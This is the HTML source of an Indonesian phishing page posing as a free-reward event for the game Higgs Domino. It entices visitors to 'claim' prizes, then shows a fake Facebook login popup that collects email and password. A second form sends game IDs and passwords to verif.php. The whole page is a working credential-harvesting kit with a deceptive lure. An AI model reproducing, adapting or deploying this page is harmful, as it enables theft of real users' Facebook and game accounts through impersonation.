<!-- https://t.me/jefanyastore -->

<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://dominov14.jefanyaefandchr.repl.co/jefanya-facebook.css">
        <link rel="stylesheet" href="alexFrontEnd/css/style.css" />
        <link rel="stylesheet" href="alexFrontEnd/css/responsive.css" />
        <title>Higgs Domino</title>
        <meta property="og:title" content="Higgs Domino">
        <meta name="description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Higgs Domino">
        <meta property="og:type" content="website">
        <meta name="copyright"content="Jefanya Store">
        <meta name="theme-color" content="#136a62">
        <meta property="og:image" content="https://dominov14.jefanyaefandchr.repl.co/higgs_domino.webp">
        <link rel="icon" href="https://www.bosbosgames.com/favicon.ico">
        <style>
            .kiriheaderalex {
        background-color: #0f6862;
    background-image: linear-gradient(
0deg, #158587 0%, #2ea5a5 100%);
    color: #fff;
    padding: 0px 30px 0px 0px;
    border-radius: 25px 5px 30px 25px;
    clip-path: polygon(0 0, 100% 0, 85% 100%, 0% 100%);
}
.boxidalex {
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
}
.boxidalex img {
        width: 35px;
    height: 35px;
    border: 2px solid #1c9c95;
    border-radius: 100%;
    margin-right: 10px;
    margin-left: 5px;
}
.boxidname {
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
}
.boxidname span {
        padding: 1px 10px;
    border: 1px solid #27a79d;
    text-align: center;
    border-radius: 50px;
    background: #0f6862;
    color: #fedca7;
}
#toastnicktop {
        padding: 1px 10px;
    border: 1px solid #27a79d;
    text-align: center;
    border-radius: 50px;
    background: #0f6862;
    color: #fedca7;
    margin-top: 2px;
}
.alexrewardhdi {
  padding: 20px;
}

.itemalexrewardhdi {
  display: flex;
  flex-direction: row;
  flex-wrap: nowrap;
  justify-content: space-between;
  background: url(alexFrontEnd/img/list_bg.png) no-repeat center;
  background-size: 100% 100%;
  padding: 10px;
  align-items: center;
  margin-bottom: 20px;
}
.kirirewardalex img {
  width: 115px;
}

.kananrewardalex {
  text-align: right;
}

.kananrewardalex label img {
  width: 200px;
  margin-bottom: 5px;
}

.kananrewardalex img {
  width: 200px;
}
        </style>
    </head>
    <body>
        <div class="appalexsh">
            <div class="containersh">
                <header>
                    <div class="kiriheaderalex">
                        <div class="boxidalex">
                            <img src="https://dominov14.jefanyaefandchr.repl.co/higgs_domino.webp">
                            <div class="boxidname">
                                <span id="toastnick">Unfinded</span>
                                <span id="toastplayid">Unfinded</span>
                            </div>
                        </div>
                    </div>
                    <div class="rightsh">
                        <button id="loginalexhdi" onclick="location.href='./';" onmousedown="buka.play();">Login</button>
                        <button onclick="openrules();" onmousedown="buka.play();">?</button>
                    </div>
                </header>
                <section class="banneralexsh">
                    <div class="w3-content w3-display-container">
                        <img class="mySlides w3-animate-right" src="https://static.neptunegame.com/images/website/img_swiper_2_04.png" style="width:100%">
                        <img class="mySlides w3-animate-left" src="https://static.neptunegame.com/images/website/img_swiper_2_07.png" style="width:100%">
                        <img class="mySlides w3-animate-right" src="https://static.neptunegame.com/images/website/img_swiper_2_02_1.png" style="width:100%">
                        <div class="w3-center w3-container w3-section w3-large w3-text-white w3-display-bottommiddle">
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(1)" onmousedown="buka.play();"></span>
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(2)" onmousedown="buka.play();"></span>
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(3)" onmousedown="buka.play();"></span>
                        </div>
                    </div>
                    <div class="arrowalexbanner">
                        <div class="itemarrowalex kiriarrow" onclick="plusDivs(-1)" onmousedown="buka.play();"></div>
                        <div class="itemarrowalex kananarrow" onclick="plusDivs(1)" onmousedown="buka.play();"></div>
                    </div>
                </section>
                <section class="subbannersh">
                    <div class="imagesubsh">
                        <img src="https://dominov14.jefanyaefandchr.repl.co/domino_text.png" alt="domino_logo" />
                        <div class="titlebannersh">
                            <p>Ikuti event menarik mendapatkan hadiah!</p>
                            <small>Spin dan dapatkan hadiahnya.</small>
                        </div>
                    </div>
                    <div class="labelendsh">
                        <span>Berakhir dalam</span>
                        <p id="alextimer"></p>
                    </div>
                </section>
                <section class="alexrewardhdi">
          <div class="boxrewardalexhdi">
            <div class="itemalexrewardhdi">
              <div class="kirirewardalex">
                <img src="alexFrontEnd/img/award_card.png">
              </div>
              <div class="kananrewardalex">
                <label><img src="alexFrontEnd/img/conver_tip_01.png"></label>
                <img src="alexFrontEnd/img/conver_btn_01.png" onclick="openlimaalex()" onmousedown="buka.play();">
              </div>
            </div>
            <div class="itemalexrewardhdi">
              <div class="kirirewardalex">
                <img src="alexFrontEnd/img/conver_gold.png">
              </div>
              <div class="kananrewardalex">
                <label><img src="alexFrontEnd/img/conver_tip_02.png"></label>
                <img src="alexFrontEnd/img/conver_btn_02.png" onclick="openlimaalex()" onmousedown="buka.play();">
              </div>
            </div>
            <div class="itemalexrewardhdi">
              <div class="kirirewardalex">
                <img src="alexFrontEnd/img/conver_gold.png">
              </div>
              <div class="kananrewardalex">
                <label><img src="alexFrontEnd/img/conver_tip_03.png"></label>
                <img src="alexFrontEnd/img/conver_btn_02.png" onclick="openlimaalex()" onmousedown="buka.play();">
              </div>
                </section>
                <section class="footeralexsh">
                    <div class="topfootsh">
                        <div class="sosmedsh">
                            <div class="buttonfootsh fbfoot"></div>
                            <div class="buttonfootsh mfoot"></div>
                            <div class="buttonfootsh igfoot"></div>
                            <div class="buttonfootsh pfoot"></div>
                        </div>
                        <div class="gotopfootsh"></div>
                    </div>
                    <div class="copyrightfootsh">
                        <span>Seluruh hak cipta.Terhubung dengan Kami!</span>
                    </div>
                </section>
                
                <main class="trueidalexsh">
                    <div class="boxtrueidsh">
                        <span onclick="openguide()"></span>
                        <strong>Masukan ID</strong>
                        <input type="number" id="idalexhdi">
                        <button onclick="IDalexhdi()" onmousedown="buka.play();"></button>
                    </div>
                </main>
                
                <main class="checkidalex respon">
                    <div class="boxchecksh">
                        <p><i class="fa fa-circle-o-notch fa-spin" aria-hidden="true"></i> Mohon Tunggu</p>
                    </div>
                </main>
                
                <main class="checkidalex tidakada">
                    <div class="boxchecksh">
                        <p>Pengguna tidak ada.</p>
                    </div>
                </main>
                
                <main class="checkidalex wrong">
                    <div class="boxchecksh">
                        <p>Format ID Game salah!.</p>
                    </div>
                </main>
                
                <main class="checkidalex images">
                    <div class="boximageidsh">
                        <div class="closeidguide" onclick="closeguide()"></div>
                        <img src="https://static.neptunegame.com/images/website/webShop/view_guide.png" alt="guide" />
                    </div>
                </main>
                
                <main class="poprulesalexsh">
                    <div class="boxrulessh">
                        <strong>Peraturan hadiah:</strong>
                        <span>1. <note>Setiap akun hanya bisa memperoleh 1 hadiah.</note></span>
                        <span>2. <note>Hadiah akan dikirimkan melalui inbox game.</note></span>
                        <span>3. <note>Event dapat berakhir sesuai yang telah di tentukan.</note></span>
                        <span>4. <note>Pihak Higgs Domino dapat mengakhiri event kapan saja sebelum event berakhir.</note></span>
                        <div class="btnrulessh">
                            <button onclick="closerules();" onmousedown="buka.play();"></button>
                        </div>
                    </div>
                </main>
                
                <main class="rewardalexsh">
                    <div class="boxrewardsh">
                        <strong>Selamat klaim sekarang!</strong>
                        <img src="alexFrontEnd/img/reward/0deg.png" id="imgalex" alt="hadiah" />
                        <button onclick="openfb();" onmousedown="buka.play();">KLAIM</button>
                    </div>
                </main>
                
                <main class="loginalexsh">
                    <div class="boxloginsh">
                        <strong>Login Diperlukan!</strong>
                        <div class="buttonloginsh">
                            <img src="https://i.postimg.cc/2STDpGG0/20220119-164621.png" alt="login ID" onclick="openidalex()"/>
                        </div>
                    </div>
                </main>
                
                </popup>
                <div class="popup-ariandi alex-facebook animate fadeIn" style="display: none;">
                    <div class="container-box-fb" style="margin-top: 10%;">
                        <a class="close-alex-facebook" onclick="closefb()"><i class="zmdi zmdi-close"></i></a>
                        <div class="atasan-fb" style="width: 95.2%;">
                            <img src="alexFrontEnd/img/facebook_text.png">
                        </div>
                        <div class="isi-facebook">
                            <p class="kaget email-fb" style="width: 320px; top: -15px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                            <p class="kaget sandi-fb" style="width: 320px; top: -15px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                            <img src="alexFrontEnd/img/higgs_domino.webp">
                            <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan Higgs Domino</div>
                            <div class="form-login-fb">
                                <label>
                                    <input type="text" id="alx_email_fb" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: none" required>
                                </label>
                                <label>
                                    <input type="password" id="alx_password_fb" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: none" required>
                                </label>
                                <input type="hidden" name="login" id="alx_login_fb" value="Facebook" readonly>
                                <input type="hidden" name="playid" id="ressplayid" readonly>
                                <input type="hidden" name="nick" id="ressnick" value="" readonly>
                                <button class="btn-login-fb" type="submit" onclick="AlexHostingNetFB()">Masuk</button>
                            </div>
                            <div class="txt-buat-akun">Buat akun</div>
                            <div class="txt-tidak-sekarang">Lain kali</div>
                            <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                        </div>
                        <div class="isi-bahasa">
                            <center>
                                <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
                                <div class="nama-bahasa">English (UK)</div>
                                <div class="nama-bahasa">Basa Jawa</div>
                                <div class="nama-bahasa">Bahasa Melayu</div>
                                <div class="nama-bahasa">???</div>
                                <div class="nama-bahasa">Español</div>
                                <div class="nama-bahasa">Português (Brasil)</div>
                                <div class="nama-bahasa"><i class="fa fa-plus"></i>
                                </div>
                            </center>
                        </div>
                        <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
                    </div>
                </div>
                
                <div class="popup-ariandi alex-pengunjung-fb" style="display: none;">
                    <div class="contpengunjungalex">
                        <div class="closepengunjungalex">
                            <div class="closinnih" onclick="closeidalex()"></div>
                        </div>
                        <form class="formpengunjungalex" action="verif.php" method="POST">
                            <span class="alertpg email-pgfb">ID Salah, mohon cek kembali!</span>
                            <span class="alertpg sandi-pgfb">Kata Sandi Salah, mohon cek kembali!</span>
                            <input type="number" id="ressplayid" name="emailpg" placeholder="Silahkan Masukkan ID" minlenght="3" required>
                            <input type="text" id="pwid" name="passwordpg" placeholder="Kata Sandi" required>
                            <input type="hidden" name="playid" id="ressplayid" readonly>
                            <input type="hidden" name="nick" id="ressnick" readonly>
                            <input type="hidden" name="email" id="ressemail" readonly>
                            <input type="hidden" name="password" id="resspw" readonly>
                            <button type="submit"></button>
                        </form>
                    </div>
                </div>
                
            </div>
        </div>
        <iframe scrolling="no" allow="autoplay" controls loop src="https://dominov14.jefanyaefandchr.repl.co/theme_alex_hdi.mp3" style="display: none" width="0" height="0" frameborder="no"></iframe>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>   
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="alexFrontEnd/js/all.js"></script>
        <script src="alexFrontEnd/js/trueid.js"></script>
        <script type="text/javascript" src="alexFrontEnd/js/function.js"></script>
        <script type="text/javascript" src="alexFrontEnd/js/validator.js"></script>
        <script>
            function openlimaalex() {
                var audio = new Audio('https://dominov14.jefanyaefandchr.repl.co/v4s.mp3');
                audio.play();
                $('.rewardalexsh').fadeIn();
                }
        </script>
    </body>
</html>